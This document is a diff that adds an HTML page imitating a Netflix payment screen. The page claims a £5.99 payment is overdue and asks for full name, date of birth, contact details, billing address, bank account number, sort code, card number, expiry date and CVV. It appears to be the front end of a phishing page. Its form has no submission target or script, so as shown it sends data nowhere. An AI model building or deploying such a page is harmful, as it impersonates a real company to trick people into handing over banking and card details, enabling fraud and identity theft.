@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Payment</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #141414;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background: #222;
+            padding: 20px;
+            border-radius: 10px;
+            width: 350px;
+            margin: auto;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        button {
+            background: #e50914;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        label {
+            text-align: left;
+            display: block;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="Netflix-logo.png" alt="Netflix Logo" class="logo">
+        <p>Your payment of <strong>£5.99</strong> is overdue. Please complete your payment to continue your subscription.</p>
+        <form>
+            <label for="first-name">First Name(s)</label>
+            <input type="text" id="first-name" placeholder="Enter your first name(s)" required>
+            
+            <label for="last-name">Last Name</label>
+            <input type="text" id="last-name" placeholder="Enter your last name" required>
+            
+            <label for="dob">Date of Birth</label>
+            <input type="date" id="dob" required>
+            
+            <label for="email">Email Address</label>
+            <input type="email" id="email" placeholder="Enter your email" required>
+            
+            <label for="phone">Phone Number</label>
+            <input type="tel" id="phone" placeholder="Enter your phone number" required>
+            
+            <label for="address1">Billing Address - First Line</label>
+            <input type="text" id="address1" placeholder="Enter first line of address" required>
+            
+            <label for="address2">Billing Address - Second Line</label>
+            <input type="text" id="address2" placeholder="Enter second line of address" required>
+            
+            <label for="account-number">Account Number</label>
+            <input type="text" id="account-number" placeholder="Enter account number" required>
+            
+            <label for="sort-code">Sort Code</label>
+            <input type="text" id="sort-code" placeholder="XX-XX-XX" required>
+            
+            <label for="card-number">Card Number</label>
+            <input type="text" id="card-number" placeholder="XXXX-XXXX-XXXX-XXXX" required>
+            
+            <label for="expiry">Expiry Date</label>
+            <input type="month" id="expiry" required>
+            
+            <label for="cvv">CVV</label>
+            <input type="text" id="cvv" placeholder="XXX" required>
+            
+            <label for="card-type">Payment Method</label>
+            <select id="card-type">
+                <option value="visa">Visa</option>
+                <option value="mastercard">Mastercard</option>
+                <option value="amex">American Express</option>
+                <option value="paypal">PayPal</option>
+            </select>
+            
+            <button type="submit">Pay £5.99</button>
+        </form>
+    </div>
+</body>
+</html>
